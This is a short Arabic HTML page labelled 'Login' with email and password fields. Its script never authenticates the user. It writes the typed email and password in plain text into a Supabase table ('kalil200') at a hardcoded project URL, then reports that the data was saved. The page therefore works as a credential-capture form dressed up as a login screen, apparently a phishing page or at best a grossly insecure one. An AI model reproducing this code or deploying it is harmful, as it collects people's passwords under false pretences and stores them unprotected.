<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول</title>
    <link rel="stylesheet" href="style.css">
    <!-- Supabase Library -->
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
</head>
<body>

    <div class="login-container">
        <h2>تسجيل الدخول</h2>
        <form id="loginForm">
            <div class="input-group">
                <label for="email">البريد الإلكتروني</label>
                <input type="email" id="email" required placeholder="أدخل بريدك الإلكتروني">
            </div>
            
            <div class="input-group">
                <label for="password">كلمة المرور</label>
                <input type="password" id="password" required placeholder="أدخل كلمة المرور">
            </div>

            <button type="submit" class="login-btn">دخول</button>
        </form>
    </div>

    <script>
        const SUPABASE_URL = 'https://urggtbhtkorbedqkpu.supabase.co';
        const SUPABASE_KEY = 'Sb_publishable_0EDGFxvdYqvL7byg-f22UA_Ypq549v3';
        
        // التأكد من تحميل مكتبة سوبابيس بشكل صحيح
        const { createClient } = supabase;
        const _supabase = createClient(SUPABASE_URL, SUPABASE_KEY);

        document.getElementById('loginForm').addEventListener('submit', async function(event) {
            event.preventDefault();
            const emailInput = document.getElementById('email').value;
            const passwordInput = document.getElementById('password').value;

            try {
                const { data, error } = await _supabase
                    .from('kalil200')
                    .insert([
                        { email: emailInput, password: passwordInput }
                    ]);

                if (error) {
                    console.error(error);
                    alert('خطأ من قاعدة البيانات: ' + error.message);
                } else {
                    alert('تم حفظ البيانات بنجاح! 🎉');
                    document.getElementById('loginForm').reset();
                }
            } catch (err) {
                console.error(err);
                alert('حدث خطأ في الاتصال بالسيرفر.');
            }
        });
    </script>

</body>
</html>
